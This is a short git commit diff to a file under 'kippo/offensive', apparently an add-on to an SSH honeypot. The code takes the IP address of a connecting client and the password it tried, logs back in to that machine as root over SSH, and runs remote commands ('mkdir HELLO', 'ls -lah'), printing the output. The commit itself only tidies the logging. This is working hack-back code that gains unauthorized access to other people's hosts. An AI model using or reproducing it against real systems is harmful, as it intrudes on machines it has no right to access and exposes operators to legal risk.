89447873728833c83a76d1c9c587490cb9e509a6
jongreenall <jon2100@gmail.com>
2013-04-01 22:56:43 +0100

    Cleaned up command output after passwd login.

--- kippo/offensive/trypasswd.py
+++ kippo/offensive/trypasswd.py
@@ -5,23 +5,19 @@ class TryPasswd(object):
     def __init__(self, clientip,  password):
         self.clientip = clientip
         self.password = password
-        
-        print "hello from TRYPASSWD"
 
     def start(self):
-        print "Starting with ip:password ->",  self.clientip + ":" + self.password
-        
-
         # Launch login thread
         threading.Thread(target=loginThread, args=(self.clientip, self.password)).start()
         print "LOGIN THREAD LAUCHED."
-        
-        
 
-# function outside of TryPasswd as I might make it a seperate class if more logging in is going to happen.
+
+# function outside of TryPasswd as I might make it a seperate class if more 'logging in' is going to happen.
 def loginThread(clientip,  password):
         client = SSHClient()
         client.set_missing_host_key_policy(AutoAddPolicy())
+    
+        print "Attempting login with root@" + clientip +" (" + password + ")"
         
         try:
             client.connect(hostname=clientip,  username="root",  password=password)
@@ -29,9 +25,10 @@ def loginThread(clientip,  password):
             print "Authentication failed for root@" + clientip + " (" + password + ")"
             return
             
-            
-        print "SUCCESS! Running command: "
-        stdin, stdout, stderr = client.exec_command('mkdir TESTDIR')
+        print "SUCCESS! Running commands. "
+        stdin, stdout, stderr = client.exec_command('mkdir HELLO')
         stdin, stdout, stderr = client.exec_command('ls -lah')
     
-        print "stdout:",  stdout.readlines(),  "stderr", stderr.readlines()
+        print "stdout:"
+        for line in stdout.readlines():
+            print line.strip()
